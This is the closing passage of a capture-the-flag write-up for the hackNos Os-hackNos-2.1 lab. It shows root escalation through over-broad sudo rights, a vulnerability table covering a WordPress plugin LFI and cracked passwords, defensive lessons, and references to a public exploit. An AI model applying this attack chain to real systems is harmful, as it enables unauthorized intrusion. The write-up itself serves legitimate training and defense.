> effectively unlimited root. All we needed was his password.

```bash
sudo /bin/bash
```

```text
root@hacknos:~# id
uid=0(root) gid=0(root) groups=0(root)
root@hacknos:~# cat /root/root.txt
```

```text
#############################################################
#  Congratulations! You have rooted the box.
#  MD5-HASH : <root flag hash here>
#  Author : Rahul Gehlaut
#############################################################
```

> **Why it works:** because `rohit` may run *anything* via sudo, `sudo /bin/bash`
> launches a shell **as root**. No exploit is required — the misconfiguration
> *is* the vulnerability. Game over.

![Root shell and root flag](images/05-root-shell.png)

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Location | Impact | Fix |
|---|---|---|---|---|
| 1 | **WordPress plugin LFI (CVE-2019-9618)** | `gracemedia-media-player` `ajax_controller.php?cfg=` | Reads arbitrary files → credential leak | Update/remove the plugin; validate `cfg` against an allow-list |
| 2 | **Outdated plugin** | GraceMedia Media Player 1.0 | Public exploit available | Keep plugins updated; remove unused ones |
| 3 | **Cleartext hashes in `/etc/passwd`** | `flag` account password field | Offline crack to a valid password | Store hashes in `/etc/shadow` only |
| 4 | **Weak passwords** | `topsecret`, `!%hack41` | Cracked in seconds with a wordlist | Strong, unique passphrases; MFA |
| 5 | **World-readable password backup** | `/var/backups/passbkp/md5-hash` | Leaks another user's hash | Restrict backup perms; never store hashes in readable files |
| 6 | **Restricted shell is not a jail** | `flag` uses `/bin/rbash` | Escaped via Python/`vi`/SSH `-t` | Use proper jails/containers, not just `rbash` |
| 7 | **Over-broad sudo rights** | `rohit` has `(ALL:ALL) ALL` | Trivial full root compromise | Grant only specific commands; least privilege |
| 8 | **Local file read as a service** | WordPress runs as `www-data` | Any file the web user can read is exposed | Least-privilege file perms for the web user |

---

## 6. Defensive lessons (blue team)

- **Patch and audit WordPress plugins.** Third-party plugins are the single most
  common WordPress compromise. Remove anything unused and update the rest.
- **Never pass user input to `include`/`require`.** The LFI is the root cause of
  the whole chain. Validate `cfg` against a strict allow-list of known files.
- **Keep password hashes out of `/etc/passwd`.** Modern systems store hashes in
  root-only `/etc/shadow`. A hash in a world-readable file is fair game.
- **Enforce strong passwords.** `topsecret` and `!%hack41` fell to `rockyou.txt`
  in seconds. Length and uniqueness matter far more than complexity tricks.
- **Treat backups as secrets.** `/var/backups/passbkp/md5-hash` handed us a
  second account. Backups should be root-owned, encrypted, and off-host.
- **`rbash` is not a security boundary.** It only restricts the first shell.
  Use containers, AppArmor, or a real chroot if you need confinement.
- **Apply least privilege to sudo.** `(ALL:ALL) ALL` for a regular user is a
  root-level risk. Scope sudo to the exact commands each user needs.
- **Alert on writes to `/etc/passwd` and new sudoers entries**, and monitor web
  requests containing long `../../` traversal sequences.

---

## 7. References

- **Repository primer** — the fundamentals behind every command in this document: [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md)

- VulnHub — hackNos: Os-hackNos-2.1 entry: https://vulnhub.com/entry/hacknos-os-hacknos-21,403/
- CVE-2019-9618 (NVD): https://nvd.nist.gov/vuln/detail/CVE-2019-9618
- Exploit-DB 46537 (GraceMedia Media Player LFI): https://www.exploit-db.com/exploits/46537
- Patchstack advisory (GraceMedia): https://patchstack.com/database/wordpress/plugin/gracemedia-media-player/vulnerability/wordpress-gracemedia-media-player-plugin-1-0-local-file-inclusion-lfi-vulnerability
- WPScan (WordPress security scanner): https://github.com/wpscanteam/wpscan
- John the Ripper: https://www.openwall.com/john/
- Author's own walkthrough (hackNos.com): https://www.hacknos.com/os-hacknos-2-walkthrough/
- Detailed Chinese walkthrough (caolu): https://it.caolu.xin/v/fjuklb/

---

## 8. Screenshot checklist

Capture these as you go so you can reproduce the writeup with images. Save them
in `images/` with the filenames used in this document.

- [ ] `images/01-netdiscover.png` — `netdiscover`/`arp-scan` showing `192.168.56.101`
- [ ] `images/02-dirb.png` — `dirb`/Nikto discovering `/tsweb/` (WordPress)
- [ ] `images/03-lfi-passwd.png` — LFI reading `/etc/passwd`
- [ ] `images/04-rbash-escape.png` — escaping the `rbash` restricted shell
- [ ] `images/05-root-shell.png` — `id` showing `uid=0(root)` and `/root/root.txt`
- [ ] `images/06-nmap.png` — nmap showing SSH (22) and HTTP (80)
- [ ] `images/07-wpscan.png` — `wpscan` listing user `user` and the vulnerable plugin
- [ ] `images/08-john-flag.png` — John cracking the `flag` hash to `topsecret`
- [ ] `images/09-backup-hash.png` — `/var/backups/passbkp/md5-hash`
- [ ] `images/10-john-rohit.png` — John cracking `rohit` to `!%hack41`
- [ ] `images/11-sudo-l.png` — `sudo -l` showing `(ALL : ALL) ALL`

---

*hackNos: Os-hackNos-2.1 is a great intermediate box: it chains a vulnerable
WordPress plugin into a credential leak, then rewards patient enumeration —
a readable hash backup, a cracked password, and a wildly over-permissive sudo
rule. Try to solve each stage yourself before reading ahead.*
